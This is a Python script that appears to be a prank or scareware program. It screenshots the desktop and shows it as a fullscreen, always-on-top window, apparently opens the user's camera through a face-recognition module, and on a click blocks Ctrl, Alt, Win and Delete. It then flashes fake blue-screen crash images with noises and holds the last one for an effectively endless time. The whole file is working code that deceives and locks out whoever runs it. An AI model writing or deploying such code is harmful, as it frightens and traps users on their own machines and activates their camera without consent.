import pyautogui as pt
import tkinter as tk
import time
from PIL import Image, ImageTk
import os
import sys
from FaceRecognitionProjectForBsod import *
import cv2
import numpy as np
import winsound
import keyboard

dir = os.path.dirname(os.path.abspath(sys.argv[0]))

keys_to_block=['del', 'delete']

ISRUN = False

def updateImg(number, sleepNum):
    imgName = dir+"/bsod" + str(number) + ".png"
    img = Image.open(imgName).resize(
        (root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS
    )
    bg1 = ImageTk.PhotoImage(img)
    bgimage.configure(image=bg1, cursor='none')
    bgimage.image = bg1
    root.update()
    time.sleep(sleepNum)

def lockallkeys():
    print("ok")


def initiate(e):
    global keys_to_block
    global ISRUN
    if ISRUN == False:
        ISRUN = True
        #disable for testing
        keyboard.block_key('ctrl')
        keyboard.block_key('left ctrl')
        keyboard.block_key('right ctrl')
        keyboard.block_key('alt')
        keyboard.block_key('win')
        keys_to_block = ['delete', 'del']
        for key in keys_to_block:
            try:
                keyboard.block_key(key)
                print(f"Key : '{key}' was blocked")
            except Exception as e:
                print(f" Error blocking : '{key}': {e}")
        time.sleep(1)
        winsound.PlaySound(dir + '/noise1.wav', winsound.SND_ASYNC)
        updateImg(1, 2)
        winsound.PlaySound(dir + '/noise2.wav', winsound.SND_ASYNC)
        updateImg(2,3)
        winsound.PlaySound(dir + '/noise3.wav', winsound.SND_ASYNC)
        updateImg(3, 3)
        winsound.PlaySound(dir + '/loop.wav', winsound.SND_ASYNC)
        updateImg(4, 0.1)
        updateImg(5, 0.1)
        updateImg(7, 2)
        updateImg(6, 0.5)
        updateImg(7,1)
        updateImg(12, 0.5)
        updateImg(8, 7)
        updateImg(10, 0.1)
        updateImg(9, 0.4)
        updateImg(10,0.5)
        updateImg(11,6)
        updateImg(13,0.01)
        winsound.PlaySound(dir + '/sound1.wav', winsound.SND_ASYNC)
        for i in range (20):
            updateImg(11, 0.001)
            updateImg(13, 0.001)
            winsound.PlaySound(dir + '/noise1.wav', winsound.SND_ASYNC)
        winsound.PlaySound(dir + '/noise1.wav', winsound.SND_ASYNC)
        updateImg(15, 3)
        winsound.PlaySound(dir + '/noise1.wav', winsound.SND_ASYNC)
        updateImg(14, 1)
        winsound.PlaySound(dir + '/noise1.wav', winsound.SND_ASYNC)
        updateImg(13, 3)
        updateImg(16, 99999999999999999999999999999999999999999999999999999999999999999999999999)

pt.getInfo()
pt.printInfo()

time.sleep(3)

pt.hotkey("win","d")

time.sleep(0.7)

im = pt.screenshot('desktop.png')

root = tk.Tk()

root.geometry("{}x{}+0+0".format(root.winfo_screenwidth(),
              root.winfo_screenheight()))

bg = tk.PhotoImage(file="desktop.png")

bgimage = tk.Label(root, image=bg, width =root.winfo_screenwidth(),
                   height=root.winfo_screenheight(), borderwidth=0)

bgimage.place(x=0, y=0)

root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
open_user_camera()
bgimage.bind('<Button-1>', initiate)

lockallkeys()

root.mainloop()

